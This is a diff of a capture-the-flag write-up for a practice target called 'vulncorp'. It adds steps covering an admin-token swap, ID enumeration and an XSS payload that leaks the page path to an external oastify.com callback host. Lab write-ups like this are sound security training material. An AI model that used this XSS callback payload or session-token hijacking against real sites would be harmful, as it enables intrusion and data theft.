@@ -611,7 +611,7 @@ And yes I get the admin token cookie value :D
 
 ![alt](./images/vulncorp-19.png)
 
-Quick switch of my token with theirs and I can now access the share!
+Quick switch of my token with theirs (55fa2ffbc954b9f20d892120d7ffd92a) and I can now access the share!
 
 ![alt](./images/vulncorp-20.png)
 
@@ -619,4 +619,22 @@ This contains a file called flag.txt containing flag 8 :)
 
 OK the link to the file is http://prueba.vulncorp.co.uk/share/183/1733
 
-Which seems a little odd so maybe there are other files on a different number
+Which seems a little odd so maybe there are other files on a different number. A bit of testing a range of numbers however only shows 1733 as a valid entry
+
+So this XSS must be being triggered from somewhere, so I'm wondering if I can use the same trick to see where/which path
+
+Using the below I get an interaction on view_message939
+
+```javascript
+<script>var i = new Image();i.src="http://" + window.location.pathname.replaceAll("/", "") + ".edv06loc8zmcmb18zcq4mh9jnat0hp.oastify.com";document.getElementsByTagName('body')[0].appendChild(i);</script>
+```
+
+Bit of playing with the path and I work out the URL is http://prueba.vulncorp.co.uk/view_message/939
+
+This shows the message and then a refresh immediately after shows the message as being not found. Trying a message id with a range of 1-5000 shows message not found for all results.
+
+OK I think I need to look elsewhere now. Quick google on vulncorp and a linkedin entry pops up!
+
+![alt](./images/vulncorp-21.png)
+
+Flag 9 found, challenge complete :)
